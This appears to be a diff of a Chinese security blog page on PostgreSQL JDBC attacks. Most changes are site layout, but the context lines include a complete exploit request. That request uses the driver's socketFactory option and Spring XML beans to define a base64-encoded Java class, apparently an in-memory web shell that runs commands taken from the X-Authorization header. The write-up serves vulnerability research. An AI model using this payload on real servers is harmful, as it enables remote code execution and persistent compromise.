@@ -1,56 +1,109 @@
 <!doctype html>
-<html lang="zh-CN" data-theme="light">
+<html lang="zh-CN">
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#173f32">
-<meta name="description" content="卷毛肖恩的个人博客">
-<title>PostgreSQL-JDBC-Attack · CurlySean&#39;s Blog</title>
-<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
-<link rel="stylesheet" href="/fontawesome/solid.min.css">
-<link rel="stylesheet" href="/fontawesome/brands.min.css">
+<meta name="theme-color" content="#f7f7f4">
+<meta name="color-scheme" content="light">
+
+<title>PostgreSQL-JDBC-Attack — CurlySean&#39;s Blog</title>
+<meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
+<link rel="canonical" href="http://curlysean.github.io/2025/08/07/PostgreSQL-JDBC-Attack/">
 <link rel="stylesheet" href="/css/style.css">
+<script>document.documentElement.classList.add('js')</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
-<body class="page-post">
-  <a class="skip-link" href="#main">跳到正文</a>
-  <header class="site-header">
-  <div class="shell header-inner">
-    <a class="brand" href="/" aria-label="返回首页">
-      <span class="brand-mark" aria-hidden="true"><img src="/images/curly-sean-avatar.png" alt=""></span>
-      <span>卷毛肖恩<small>PERSONAL BLOG</small></span>
+<body class="page-type-post">
+  <a class="skip-link" href="#main-content">跳至正文</a>
+  
+<header class="site-header" data-header>
+  <div class="site-header__inner frame">
+    <a class="brand" href="/" aria-label="CurlySean&#39;s Blog 首页">
+      <span class="brand__name">CURLYSEAN</span>
+      <span class="brand__suffix">SECURITY NOTES</span>
     </a>
-    <button class="nav-toggle" type="button" aria-label="打开导航" aria-expanded="false"><i class="fa-solid fa-bars"></i></button>
-    <nav class="site-nav" aria-label="主导航">
+    <nav class="desktop-nav" aria-label="主导航">
       
-        <a href="/">首页</a>
+        <a class="desktop-nav__link" href="/">首页</a>
       
-        <a href="/archives/">归档</a>
+        <a class="desktop-nav__link" href="/archives/">文章</a>
       
-        <a href="/categories/">分类</a>
+        <a class="desktop-nav__link" href="/categories/">分类</a>
       
-        <a href="/tags/">标签</a>
+        <a class="desktop-nav__link" href="/tags/">标签</a>
       
-        <a href="/about/">关于</a>
+        <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <div class="header-actions">
-      <button class="icon-button search-open" type="button" aria-label="搜索"><i class="fa-solid fa-magnifying-glass"></i></button>
-      <button class="icon-button theme-toggle" type="button" aria-label="切换深色模式"><i class="fa-solid fa-moon"></i></button>
-    </div>
+    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
+    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+      <span class="sr-only">打开导航</span>
+      <span></span><span></span>
+    </button>
   </div>
+  <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
+    <div class="frame mobile-nav__inner">
+      
+        <a class="mobile-nav__link" href="/">
+          <span>01</span>首页<i aria-hidden="true">↗</i>
+        </a>
+      
+        <a class="mobile-nav__link" href="/archives/">
+          <span>02</span>文章<i aria-hidden="true">↗</i>
+        </a>
+      
+        <a class="mobile-nav__link" href="/categories/">
+          <span>03</span>分类<i aria-hidden="true">↗</i>
+        </a>
+      
+        <a class="mobile-nav__link" href="/tags/">
+          <span>04</span>标签<i aria-hidden="true">↗</i>
+        </a>
+      
+        <a class="mobile-nav__link" href="/about/">
+          <span>05</span>关于<i aria-hidden="true">↗</i>
+        </a>
+      
+    </div>
+  </nav>
 </header>
 
-  
-  <main id="main" class="site-main shell">
-    <div class="post-layout">
-  <article class="article-shell">
-    <header class="article-header">
-      <div class="post-meta"><time>2025.08.07</time><span>Java</span><span>约 39 分钟阅读</span></div>
-      <h1>PostgreSQL-JDBC-Attack</h1>
-      <div class="post-tags"><a href="/tags/JDBC/">#JDBC</a></div>
-    </header>
-    <div class="article-content"><h1 id="HDMcM">PostgreSQL-JDBC-Attack</h1>
+  <main id="main-content">
+    
+<article class="post-page">
+  <header class="post-hero">
+    <div class="frame post-hero__grid reveal">
+      <div class="post-hero__label">
+        <p class="eyebrow">FIELD NOTE / 2025</p>
+        
+          <a href="/categories/Java/">Java ↗</a>
+        
+      </div>
+      <div class="post-hero__main">
+        <h1>PostgreSQL-JDBC-Attack</h1>
+        
+      </div>
+    </div>
+    <div class="frame post-meta-grid reveal">
+      <div><span>发布</span><time datetime="2025-08-07T05:37:13.000Z">2025.08.07</time></div>
+      <div><span>更新</span><time datetime="2025-08-07T05:37:13.000Z">2025.08.07</time></div>
+      <div><span>阅读</span><strong>41 MIN</strong></div>
+      <div><span>标签</span><strong>1</strong></div>
+    </div>
+  </header>
+
+  <div class="frame post-content-layout">
+    <aside class="post-rail">
+      <div class="post-rail__inner">
+        <p class="eyebrow">ON THIS PAGE</p>
+        
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HDMcM"><span class="toc-text">PostgreSQL-JDBC-Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#FdnpK"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NS9IA"><span class="toc-text">PostgreSQL-JDBC RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#aPut1"><span class="toc-text">PostgreSQL Diver出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#kB94K"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#K49ou"><span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ti04E"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#f8A4x"><span class="toc-text">其他利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#mczVG"><span class="toc-text">JLabel</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#A8bcB"><span class="toc-text">MiniAdmin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#tVBEe"><span class="toc-text">IniEnvironment</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ihRex"><span class="toc-text">HikariConfig</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ARtJM"><span class="toc-text">任意文件写入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ldLXH"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JrAG1"><span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xdkTh"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PvIWE"><span class="toc-text">其他利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#NXNu0"><span class="toc-text">log4j2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DQF19"><span class="toc-text">jar&#x2F;war包等zip包</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Y6juf"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QUkZI"><span class="toc-text">PostgreSQL不出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XjfxO"><span class="toc-text">漏洞分析</span></a></li></ol></li></ol></li></ol></nav>
+        
+      </div>
+    </aside>
+    <div class="article-column">
+      <div class="article-body reveal">
+        <h1 id="HDMcM">PostgreSQL-JDBC-Attack</h1>
 <h2 id="FdnpK">前言</h2>
 之前学习过通过Mysql驱动进行JDBC反序列化，最近有听到JDBC不出网的利用方式，今天来学习一下
 
@@ -218,39 +271,50 @@ Mysql的套娃，需要有mysql-connector-java（<font style="color:rgb(0, 0, 0)
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jdbc?url=jdbc:postgresql:///test/?a=&amp;url=%26socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext%26socketFactoryArg=file://%24%7bcatalina.home%7d/**/*.tmp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.111.1:8080</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">X-Authorization</span><span class="punctuation">: </span>whoami</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryIg9FMRJD9ScjO8dH</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>135</span><br><span class="line"></span><br><span class="line"><span class="language-bash">------WebKitFormBoundaryIg9FMRJD9ScjO8dH</span></span><br><span class="line"><span class="language-bash">Content-Disposition: form-data; name=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="language-bash">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="language-bash">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="language-bash">                           http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="language-bash">    &lt;bean <span class="built_in">id</span>=<span class="string">&quot;decoder&quot;</span> class=<span class="string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;property name=<span class="string">&quot;staticMethod&quot;</span> value=<span class="string">&quot;javax.xml.bind.DatatypeConverter.parseBase64Binary&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;property name=<span class="string">&quot;arguments&quot;</span>&gt;</span></span><br><span class="line"><span class="language-bash">            &lt;list&gt;</span></span><br><span class="line"><span class="language-bash">                &lt;value&gt;yv66vgAAADIBOwEAXm9yZy9hcGFjaGUvY29tbW9tcy9iZWFudXRpbHMvY295b3RlL2ludHJvc3BlY3QvQW5ub3RhdGVkTWVtYmVyMjA5ZjAxMzVmYzM5NDY2ZDg0ZWY3NWZlODA2YmZjYjgHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAGPGluaXQ+AQADKClWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcABwwABQAGCgAEAAkBAANydW4MAAsABgoAAgAMAQAQZ2V0UmVxSGVhZGVyTmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAPWC1BdXRob3JpemF0aW9uCAAQAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwASAQATamF2YS9sYW5nL1Rocm93YWJsZQcAFAEAEGphdmEvbGFuZy9UaHJlYWQHABYBAApnZXRUaHJlYWRzCAAYAQAPamF2YS9sYW5nL0NsYXNzBwAaAQASW0xqYXZhL2xhbmcvQ2xhc3M7BwAcAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAeAB8KABsAIAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcAIgEADXNldEFjY2Vzc2libGUBAAQoWilWDAAkACUKACMAJgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAKAApCgAjACoBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwAsAQAHZ2V0TmFtZQwALgAPCgAXAC8BAARodHRwCAAxAQAQamF2YS9sYW5nL1N0cmluZwcAMwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDAA1ADYKADQANwEACEFjY2VwdG9yCAA5AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAA7ADwKAAQAPQEABnRhcmdldAgAPwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAEEAQgoAGwBDAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAEUKAEYAJgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABIAEkKAEYASgEACGVuZHBvaW50CABMAQAGdGhpcyQwCABOAQAHaGFuZGxlcggAUAEADWdldFN1cGVyY2xhc3MMAFIAPAoAGwBTAQAGZ2xvYmFsCABVAQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DABXAFgKABsAWQEAIm9yZy5hcGFjaGUuY295b3RlLlJlcXVlc3RHcm91cEluZm8IAFsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHAF0BAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DABfAGAKAF4AYQoAGwAvAQAKcHJvY2Vzc29ycwgAZAEAE2phdmEvdXRpbC9BcnJheUxpc3QHAGYBAARzaXplAQADKClJDABoAGkKAGcAagEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwwASABsCgBnAG0BAANyZXEIAG8BAAdnZXROb3RlCABxAQARamF2YS9sYW5nL0ludGVnZXIHAHMBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMAHUAdgkAdAB3AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsMAHkAegoAdAB7AQAJZ2V0SGVhZGVyCAB9AQAJZ2V0TWV0aG9kDAB/AB8KABsAgAwADgAPCgACAIIBAAtnZXRSZXNwb25zZQgAhAEACWdldFdyaXRlcggAhgEADmphdmEvaW8vV3JpdGVyBwCIAQAGaGFuZGxlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAIoAiwoAAgCMAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYMAI4AjwoAiQCQAQAFZmx1c2gMAJIABgoAiQCTAQAFY2xvc2UMAJUABgoAiQCWAQAEZXhlYwEAB29zLm5hbWUIAJkBABBqYXZhL2xhbmcvU3lzdGVtBwCbAQALZ2V0UHJvcGVydHkMAJ0AiwoAnACeAQALdG9Mb3dlckNhc2UMAKAADwoANAChAQADd2luCACjAQAHL2Jpbi9zaAgApQEAAi1jCACnAQAHY21kLmV4ZQgAqQEAAi9jCACrAQARamF2YS9sYW5nL1J1bnRpbWUHAK0BAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DACvALAKAK4AsQEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMAJgAswoArgC0AQARamF2YS9sYW5nL1Byb2Nlc3MHALYBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07DAC4ALkKALcAugEAEWphdmEvdXRpbC9TY2FubmVyBwC8AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAFAL4KAL0AvwEAAlxhCADBAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7DADDAMQKAL0AxQEAAAgAxwEAB2hhc05leHQBAAMoKVoMAMkAygoAvQDLAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIHAM0KAM4ACQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwwA0ADRCgDOANIBAARuZXh0DADUAA8KAL0A1QEACHRvU3RyaW5nDADXAA8KAM4A2AEACmdldE1lc3NhZ2UMANoADwoACADbAQATW0xqYXZhL2xhbmcvU3RyaW5nOwcA3QEAE2phdmEvaW8vSW5wdXRTdHJlYW0HAN8BAAZleUplWEEIAOEBAApzdGFydHNXaXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaDADjAOQKADQA5QEABmxlbmd0aAwA5wBpCgA0AOgBAAZjaGFyQXQBAAQoSSlDDADqAOsKADQA7AEAFShDKUxqYXZhL2xhbmcvU3RyaW5nOwwAeQDuCgA0AO8BAAhwYXJzZUludAEAFShMamF2YS9sYW5nL1N0cmluZzspSQwA8QDyCgB0APMBAAEuCAD1AQAHaW5kZXhPZgwA9wDyCgA0APgBAAlzdWJzdHJpbmcBABYoSUkpTGphdmEvbGFuZy9TdHJp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&lt;/value&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">            &lt;/list&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">        &lt;/property&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">    &lt;/bean&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">    &lt;bean <span class="built_in">id</span>=<span class="string">&quot;classLoader&quot;</span> class=<span class="string">&quot;javax.management.loading.MLet&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">    &lt;bean <span class="built_in">id</span>=<span class="string">&quot;clazz&quot;</span> factory-bean=<span class="string">&quot;classLoader&quot;</span> factory-method=<span class="string">&quot;defineClass&quot;</span>&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;constructor-arg ref=<span class="string">&quot;decoder&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;constructor-arg <span class="built_in">type</span>=<span class="string">&quot;int&quot;</span> value=<span class="string">&quot;0&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;constructor-arg <span class="built_in">type</span>=<span class="string">&quot;int&quot;</span> value=<span class="string">&quot;5133&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">    &lt;/bean&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">    &lt;bean factory-bean=<span class="string">&quot;clazz&quot;</span> factory-method=<span class="string">&quot;newInstance&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">&lt;/beans&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">------WebKitFormBoundaryIg9FMRJD9ScjO8dH--</span></span><br><span class="line"><span class="language-bash"></span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805740023-02a1d8b8-6fa3-4462-868a-c556fb317da4.png"></p>
-</div>
-    <footer class="article-footer"><p><i class="fa-solid fa-seedling"></i> 本文由 CurlySean 原创记录，转载请注明出处。</p></footer>
-    <nav class="post-nav"><a href="/2025/08/14/%E5%9F%BA%E4%BA%8ESqlServer%E7%9A%84SQL%E6%B3%A8%E5%85%A5/"><small>上一篇</small>基于SqlServer的SQL注入</a><a href="/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/"><small>下一篇</small>Spring内存马</a></nav>
+
+      </div>
+      
+        <div class="post-tags" aria-label="文章标签">
+          
+            <a href="/tags/JDBC/"># JDBC</a>
+          
+        </div>
+      
+    </div>
+  </div>
+
+  <nav class="frame post-navigation" aria-label="相邻文章">
     
-
-
-  </article>
-  <aside class="toc-panel"><p class="eyebrow">ON THIS PAGE</p><h2>本文目录</h2><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#FdnpK"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NS9IA"><span class="toc-text">PostgreSQL-JDBC RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#aPut1"><span class="toc-text">PostgreSQL Diver出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#kB94K"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#K49ou"><span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ti04E"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#f8A4x"><span class="toc-text">其他利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ARtJM"><span class="toc-text">任意文件写入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ldLXH"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JrAG1"><span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xdkTh"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PvIWE"><span class="toc-text">其他利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Y6juf"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QUkZI"><span class="toc-text">PostgreSQL不出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XjfxO"><span class="toc-text">漏洞分析</span></a></li></ol></li></ol></div></aside>
-</div>
+      <a href="/2025/08/14/%E5%9F%BA%E4%BA%8ESqlServer%E7%9A%84SQL%E6%B3%A8%E5%85%A5/">
+        <span>← PREVIOUS</span>
+        <strong>基于SqlServer的SQL注入</strong>
+      </a>
+    
+    
+      <a href="/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/">
+        <span>NEXT →</span>
+        <strong>Spring内存马</strong>
+      </a>
+    
+  </nav>
+</article>
 
   </main>
   <footer class="site-footer">
